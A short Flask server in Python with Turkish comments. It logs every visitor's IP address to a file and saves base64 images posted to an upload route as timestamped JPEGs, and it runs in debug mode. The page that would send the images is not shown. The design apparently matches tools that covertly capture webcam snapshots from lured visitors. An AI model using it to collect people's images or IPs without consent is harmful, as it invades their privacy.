from flask import Flask, request, render_template
import base64
import os
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    # IP loglama
    ip = request.remote_addr
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    os.makedirs("logs", exist_ok=True)
    with open("logs/ip_log.txt", "a") as log:
        log.write(f"{now} - IP: {ip}\n")

    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    img_data = data['image'].split(',')[1]
    img = base64.b64decode(img_data)

    folder = 'saved_images'
    os.makedirs(folder, exist_ok=True)
    filename = datetime.datetime.now().strftime('%Y-%m-%d--%H-%M-%S') + '.jpg'
    path = os.path.join(folder, filename)

    with open(path, 'wb') as f:
        f.write(img)

    print(f"[✓] {filename} kaydedildi.")
    return 'Görsel kaydedildi'

if __name__ == '__main__':
    app.run(debug=True)
